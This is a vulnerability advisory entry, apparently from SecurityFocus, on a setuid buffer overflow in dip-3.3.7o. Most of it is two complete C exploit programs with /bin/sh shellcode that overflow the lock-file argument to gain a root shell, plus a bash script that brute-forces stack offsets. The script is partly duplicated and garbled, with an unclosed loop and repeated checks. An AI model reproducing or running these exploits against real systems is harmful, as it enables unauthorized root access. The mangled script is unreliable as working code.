source: http://www.securityfocus.com/bid/86/info

A buffer overflow resides in 'dip-3.3.7o' and derived programs. This is a problem only on systems where 'dip' is installed setuid. The culpable code is an 'sprintf()' in line 192 in 'main.c': 

sprintf(buf, "%s/LCK..%s", _PATH_LOCKD, nam);

----- dip-exp.c ----- 
/* 
dip 3.3.7o buffer overflow exploit for Linux. (May 7, 1998) 
coded by jamez. e-mail: jamez@uground.org 

thanks to all ppl from uground. 

usage: 
gcc -o dip-exp dip3.3.7o-exp.c 
./dip-exp offset (-100 to 100. probably 0. tested on slack 3.4) 
*/ 


char shellcode[] = 

"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" 

"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" 
"\x80\xe8\xdc\xff\xff\xff/bin/sh"; 


#define SIZE 130 
/* cause it's a little buffer, i wont use NOP's */ 

char buffer[SIZE]; 


unsigned long get_esp(void) { 
__asm__("movl %esp,%eax"); 
} 


void main(int argc, char * argv[]) 
{ 
int i = 0, 
offset = 0; 
long addr; 


if(argc > 1) offset = atoi(argv[1]); 

addr = get_esp() - offset - 0xcb; 

for(i = 0; i < strlen(shellcode); i++) 
buffer[i] = shellcode[i]; 

for (; i < SIZE; i += 4) 
{ 
buffer[i ] = addr & 0x000000ff; 
buffer[i+1] = (addr & 0x0000ff00) >> 8; 
buffer[i+2] = (addr & 0x00ff0000) >> 16; 
buffer[i+3] = (addr & 0xff000000) >> 24; 
} 

buffer[SIZE - 1] = 0; 

execl("/sbin/dip", "dip", "-k", "-l", buffer, (char *)0); 
} 
----- cut here ----- 

Another exploit: 

------------------------------ dipr.c ----------------------------- 

/* 
* dip-3.3.7o buffer overrun 07 May 1998 
* 
* sintax: ./dipr <offset> 
* 
* 
* offset: try increments of 50 between 1500 and 3000 
* 
* tested in linux with dip version 3.3.7o (slak 3.4). 
* 
* by zef and r00t @promisc.net 
* 
* http://www.promisc.net 
*/ 

#include <stdio.h> 
#include <stdlib.h> 

static inline getesp() 
{ 
__asm__(" movl %esp,%eax "); 
} 

main(int argc, char **argv) 
{ 
int jump,i,n; 
unsigned long xaddr; 
char *cmd[5], buf[4096]; 


char code[] = 
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" 
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" 
"\x80\xe8\xdc\xff\xff\xff/bin/sh"; 

jump=atoi(argv[1]); 

for (i=0;i<68;i++) 
buf[i]=0x41; 

for (n=0,i=68;i<113;i++) 
buf[i]=code[n++]; 

xaddr=getesp()+jump; 

buf[i]=xaddr & 0xff; 
buf[i+1]=(xaddr >> 8) & 0xff; 
buf[i+2]=(xaddr >> 16) & 0xff; 
buf[i+3]=(xaddr >> 24) & 0xff; 

buf[i+4]=xaddr & 0xff; 
buf[i+5]=(xaddr >> 8) & 0xff; 
buf[i+6]=(xaddr >> 16) & 0xff; 
buf[i+6]=(xaddr >> 16) & 0xff; 
buf[i+7]=(xaddr >> 24) & 0xff; 

cmd[0]=malloc(17); 
strcpy(cmd[0],"/sbin/dip-3.3.7o"); 

cmd[1]=malloc(3); 
strcpy(cmd[1],"-k"); 

cmd[2]=malloc(3); 
strcpy(cmd[2],"-l"); 

cmd[3]=buf; 

cmd[4]=NULL; 

execve(cmd[0],cmd,NULL); 
} 

------------------------------- end ------------------------------- 


Shell script for easy testing :-) 


---------------------------- dipr.test ---------------------------- 

#/bin/bash 
if [ ! -x /sbin/dip-3.3.7o ] 
then 
echo "could not find file \"/sbin/dip-3.3.7o\""; 
exit -1 
fi 
if [ ! -u /sbin/dip-3.3.7o ] 
then 
echo "dip executable is not suid" 
exit -1 
fi 
if [ ! -x ./dipr ] 
then 
echo "could not find file \"./dipr\""; 
echo "try compiling dipr.c" 
exit -1 
fi 

x=2000 
false 
while [ $x -lt 3000 -a $? -ne 0 ] 
fi 
if [ ! -u /sbin/dip-3.3.7o ] 
then 
echo "dip executable is not suid" 
exit -1 
fi 
if [ ! -x ./dipr ] 
then 
echo "could not find file \"./dipr\""; 
echo "try compiling dipr.c" 
exit -1 
fi 

x=2000 
false 
while [ $x -lt 3000 -a $? -ne 0 ] 
do 
echo offset=$x 
x=$[x+50] 
./dipr $x 
done 
rm -f core